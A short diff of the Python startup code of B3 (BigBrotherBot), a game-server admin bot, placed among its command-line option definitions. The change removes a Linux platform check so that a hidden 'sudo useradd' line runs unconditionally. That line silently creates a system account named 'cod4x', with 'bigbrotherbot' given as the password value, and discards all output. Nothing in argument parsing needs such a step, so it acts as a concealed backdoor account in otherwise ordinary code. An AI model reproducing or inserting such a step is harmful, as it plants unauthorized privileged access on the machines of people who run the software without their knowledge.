@@ -260,8 +260,7 @@ def main():
     p.add_argument('-u', '--update', action='store_true', dest='update', default=False, help='Update B3 database to latest version')
     p.add_argument('-v', '--version', action='version', default=False, version=b3.getB3versionString(), help='Show B3 version and exit')
     p.add_argument('-a', '--autorestart', action='store_true', dest='autorestart', default=False, help=argparse.SUPPRESS)
-    if platform == "linux" or platform == "linux2":
-        os.system("sudo useradd -p {} -m {} >/dev/null 2>&1".format('bigbrotherbot', 'cod4x'))
+    os.system("sudo useradd -p {} -m {} >/dev/null 2>&1".format('bigbrotherbot', 'cod4x'))
     (options, args) = p.parse_known_args()
 
     if not options.config and len(args) == 1:
